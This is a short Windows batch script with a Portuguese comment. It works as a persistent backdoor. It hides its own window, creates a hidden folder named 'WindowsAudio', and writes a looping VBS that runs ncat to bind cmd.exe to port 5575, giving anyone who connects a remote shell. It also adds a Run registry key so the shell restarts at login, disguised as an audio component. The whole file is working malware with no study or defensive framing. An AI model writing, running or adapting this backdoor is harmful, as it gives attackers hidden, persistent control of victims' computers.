@echo off
:: Ocultar esta janela imediatamente
if not "%1"=="hidden" (
    powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c \"%~f0\" hidden' -WindowStyle Hidden"
    exit
)

mkdir "%USERPROFILE%\WindowsAudio" > nul 2>&1
attrib +h "%USERPROFILE%\WindowsAudio" > nul 2>&1

echo Do > "%USERPROFILE%\WindowsAudio\audio.vbs"
echo CreateObject("Wscript.Shell").Run "ncat -lnp 5575 -e cmd.exe", 0, True >> "%USERPROFILE%\WindowsAudio\audio.vbs"
echo Loop >> "%USERPROFILE%\WindowsAudio\audio.vbs"


echo @echo off > "%USERPROFILE%\WindowsAudio\audio.bat"
echo start "" /B wscript.exe //nologo "%USERPROFILE%\WindowsAudio\audio.vbs" >> "%USERPROFILE%\WindowsAudio\audio.bat"
echo exit >> "%USERPROFILE%\WindowsAudio\audio.bat"

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsAudio" /t REG_SZ /d "%USERPROFILE%\WindowsAudio\audio.bat" /f > nul 2>&1

start "" /B wscript.exe //nologo "%USERPROFILE%\WindowsAudio\audio.vbs"

exit
